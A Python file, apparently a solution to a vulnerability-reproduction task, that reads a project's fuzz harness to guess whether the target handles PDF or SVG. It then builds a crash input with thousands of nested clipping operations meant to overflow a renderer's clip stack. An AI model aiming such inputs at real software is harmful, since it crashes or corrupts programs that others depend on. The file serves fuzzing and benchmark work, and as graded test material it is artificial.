import os
from typing import List


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC input that attempts to trigger the heap buffer overflow
        by creating extremely deep clipping/layer nesting. The generation
        is guided heuristically by inspecting the fuzz harness to distinguish
        between SVG-like and PDF-like targets. For unknown targets, we fall
        back to an SVG-based PoC since many graphics libraries consume SVG.
        """
        project_type = self._detect_project_type(src_path)
        if project_type == "pdf":
            try:
                return self._generate_pdf_clip_poc(depth=6000)
            except Exception:
                # Fallback in case PDF generation fails for some reason.
                return self._generate_svg_deep_clip_poc(depth=6000)
        else:
            # Default / SVG / unknown: SVG deep-clip PoC.
            try:
                return self._generate_svg_deep_clip_poc(depth=6000)
            except Exception:
                return self._generate_generic_large_bytes()

    # ------------------------------------------------------------------ #
    # Project type detection
    # ------------------------------------------------------------------ #

    def _detect_project_type(self, root: str) -> str:
        """
        Heuristically detect the project type by examining fuzz harness files.
        Returns one of: "svg", "pdf", "skia", "unknown".
        """
        harness_files = self._find_harness_files(root)
        if not harness_files:
            return "unknown"

        combined = []
        for path in harness_files:
            text = self._safe_read_file(path, limit=256_000)
            if text:
                combined.append(text)
        if not combined:
            return "unknown"

        text = "\n".join(combined)
        lower = text.lower()

        # Simple keyword-based heuristic.
        if "pdfium" in lower or "fpdf_" in lower or "pdf" in lower:
            return "pdf"

        if "svg" in lower or "librsvg" in lower or "resvg" in lower:
            return "svg"

        if "skcanvas" in text or "skia" in lower or "skpicture" in text:
            return "skia"

        return "unknown"

    def _find_harness_files(self, root: str) -> List[str]:
        """
        Locate files containing LLVMFuzzerTestOneInput.
        """
        harness_files: List[str] = []
        for dirpath, _, filenames in os.walk(root):
            for name in filenames:
                if not name.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp")):
                    continue
                path = os.path.join(dirpath, name)
                text = self._safe_read_file(path, limit=128_000)
                if "LLVMFuzzerTestOneInput" in text:
                    harness_files.append(path)
            if harness_files:
                # In practice there is usually a single fuzz harness, and
                # scanning the entire tree can be expensive for large projects.
                break
        return harness_files

    def _safe_read_file(self, path: str, limit: int | None = None) -> str:
        """
        Safely read a text file with an optional size limit.
        """
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                if limit is None:
                    return f.read()
                return f.read(limit)
        except Exception:
            return ""

    # ------------------------------------------------------------------ #
    # SVG PoC generator
    # ------------------------------------------------------------------ #

    def _generate_svg_deep_clip_poc(self, depth: int = 6000) -> bytes:
        """
        Generate an SVG document with extremely deep nested clipping groups.
        Each <g clip-path="url(#c)"> pushes a clip on the stack in typical
        SVG renderers. Large 'depth' attempts to overflow unchecked stacks.
        """
        # Header & basic structure
        parts: list[str] = []
        parts.append('<?xml version="1.0" encoding="UTF-8"?>\n')
        parts.append(
            '<svg xmlns="http://www.w3.org/2000/svg" '
            'width="100" height="100" viewBox="0 0 100 100">\n'
        )
        parts.append("  <defs>\n")
        parts.append(
            '    <clipPath id="c">\n'
            '      <rect x="0" y="0" width="100" height="100"/>\n'
            "    </clipPath>\n"
        )
        parts.append("  </defs>\n")
        parts.append('  <g id="root">\n')

        # Deeply nested clip groups
        open_tag = '    <g clip-path="url(#c)">\n'
        close_tag = "    </g>\n"

        for _ in range(depth):
            parts.append(open_tag)

        # A simple shape at the deepest nesting level
        parts.append(
            '      <rect x="0" y="0" width="100" height="100" '
            'fill="black"/>\n'
        )

        for _ in range(depth):
            parts.append(close_tag)

        parts.append("  </g>\n")
        parts.append("</svg>\n")

        svg_str = "".join(parts)
        return svg_str.encode("utf-8")

    # ------------------------------------------------------------------ #
    # PDF PoC generator
    # ------------------------------------------------------------------ #

    def _generate_pdf_clip_poc(self, depth: int = 6000) -> bytes:
        """
        Generate a minimal PDF with a single page whose content stream
        performs a large number of clipping operations, building deep
        graphics-state / clip stacks.
        """
        # Build the content stream first.
        stream = self._build_pdf_clip_stream(depth=depth)
        length = len(stream)

        buf = bytearray()

        def add(data: str | bytes) -> None:
            if isinstance(data, str):
                data = data.encode("latin-1")
            buf.extend(data)

        # PDF header with binary comment line
        add("%PDF-1.4\n")
        add("%\xFF\xFF\xFF\xFF\n")

        num_objs = 4
        offsets = [0] * (num_objs + 1)  # index 0 unused except xref entry

        def add_obj(obj_num: int, body: bytes | str) -> None:
            offsets[obj_num] = len(buf)
            add(f"{obj_num} 0 obj\n")
            add(body)
            # Ensure trailing newline before endobj for well-formedness
            if not (isinstance(body, (bytes, bytearray)) and body.endswith(b"\n")) and not (
                isinstance(body, str) and body.endswith("\n")
            ):
                add("\n")
            add("endobj\n")

        # 1: Catalog
        add_obj(1, "<< /Type /Catalog /Pages 2 0 R >>\n")

        # 2: Pages
        add_obj(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n")

        # 3: Page
        page_dict = (
            "<< /Type /Page /Parent 2 0 R "
            "/MediaBox [0 0 100 100] "
            "/Contents 4 0 R >>\n"
        )
        add_obj(3, page_dict)

        # 4: Contents with many clip operations
        content_body = (
            f"<< /Length {length} >>\n"
            "stream\n"
        ).encode("latin-1") + stream + b"\nendstream\n"
        add_obj(4, content_body)

        # xref table
        startxref = len(buf)
        add("xref\n")
        add(f"0 {num_objs + 1}\n")
        # Object 0 (free head)
        add("0000000000 65535 f \n")
        for i in range(1, num_objs + 1):
            off = offsets[i]
            add(f"{off:010d} 00000 n \n")

        # trailer
        add("trailer\n")
        add(f"<< /Size {num_objs + 1} /Root 1 0 R >>\n")
        add("startxref\n")
        add(f"{startxref}\n")
        add("%%EOF\n")

        return bytes(buf)

    def _build_pdf_clip_stream(self, depth: int) -> bytes:
        """
        Build a PDF content stream that applies a large number of nested
        clipping operations with save/restore (q/Q).
        """
        lines: list[str] = []
        # Build up a deep stack of saved graphics states and clips.
        for _ in range(depth):
            # q: save graphics state
            # 0 0 100 100 re: rectangle path
            # W n: set clip & end path without painting
            lines.append("q 0 0 100 100 re W n\n")

        # Draw a filled rectangle within the deepest clip region.
        lines.append("0 0 100 100 re f\n")

        # Restore all graphics states.
        for _ in range(depth):
            lines.append("Q\n")

        return "".join(lines).encode("ascii")

    # ------------------------------------------------------------------ #
    # Fallback generator
    # ------------------------------------------------------------------ #

    def _generate_generic_large_bytes(self) -> bytes:
        """
        Fallback: generate a large but simple byte pattern. This is unlikely
        to trigger the specific bug in complex targets but guarantees a
        deterministic non-empty PoC.
        """
        return (b"A" * 1024) + (b"\x00\xFF" * 1024)